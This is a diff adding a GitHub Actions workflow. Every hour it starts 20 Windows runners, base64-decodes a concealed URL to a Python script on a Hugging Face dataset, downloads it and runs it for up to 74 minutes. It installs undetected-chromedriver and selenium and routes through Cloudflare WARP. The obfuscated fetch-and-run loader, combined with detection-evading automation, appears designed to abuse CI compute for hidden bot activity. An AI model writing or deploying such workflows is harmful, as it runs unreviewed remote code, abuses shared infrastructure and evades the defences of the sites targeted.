@@ -1,0 +1,70 @@
+name: Matrix Aut44
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: matrix-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  launch-workers:
+    name: "Agent-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - name: System Init & Dependency Setup
+        shell: bash
+        run: |
+          echo "[INITIALIZING] Setting up Worker-${{ matrix.node_index }}..."
+          
+          # فك تشفير الرابط الجديد وتحميل الملف
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$REMOTE_SRC" -o app_task.py
+          
+          echo "[INITIALIZING] Fetching required packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[INITIALIZING] Environment setup completed."
+
+      - name: Execute Script & Monitor Process
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Launching process on node ${{ matrix.node_index }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessParams = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $WorkerProc = Start-Process @ProcessParams
+          
+          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Process finished execution within limit."
+          }
+          catch {
+              Write-Output ">>> Execution threshold met! Killing process..."
+              Stop-Process -InputObject $WorkerProc -Force
+              Write-Output ">>> Process terminated successfully."
+          }
+
+      - name: Completion Status
+        shell: bash
+        run: echo "[COMPLETE] Worker-${{ matrix.node_index }} finished execution cycle."
